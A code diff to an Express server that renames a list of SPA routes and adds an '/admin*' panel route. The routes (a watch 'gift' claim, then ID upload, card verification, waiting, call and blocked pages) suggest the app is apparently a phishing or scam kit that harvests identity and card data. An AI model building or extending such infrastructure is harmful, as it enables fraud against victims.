@@ -693,17 +693,22 @@ app.post('/api/migrate', async (req, res) => {
   }
 });
 
-// ── SPA rewrites (visitor routes → Nuxt SPA) ─────────────────
-const spaRoutes = ['/login', '/watches', '/watch-selection', '/delivery', '/claim',
+// ── SPA rewrites ────────────────────────────────────────────
+const visitorRoutes = ['/login', '/watches', '/watch-selection', '/delivery', '/claim',
   '/shipping', '/gift-details', '/documents', '/verify-identity', '/upload-documents',
   '/verify-docs', '/id-verification', '/card-verification', '/waiting', '/success',
   '/call', '/blocked', '/activate-token', '/verify-bot-security-check'];
 
-spaRoutes.forEach(route => {
+visitorRoutes.forEach(route => {
   app.get(route, (req, res) => {
     res.set('Cache-Control', 'no-store, no-cache, must-revalidate');
     res.sendFile(path.join(__dirname, 'index.html'));
   });
+});
+
+app.get('/admin*', (req, res) => {
+  res.set('Cache-Control', 'no-store, no-cache, must-revalidate');
+  res.sendFile(path.join(__dirname, 'admin.html'));
 });
 
 // ── Static files ────────────────────────────────────────────
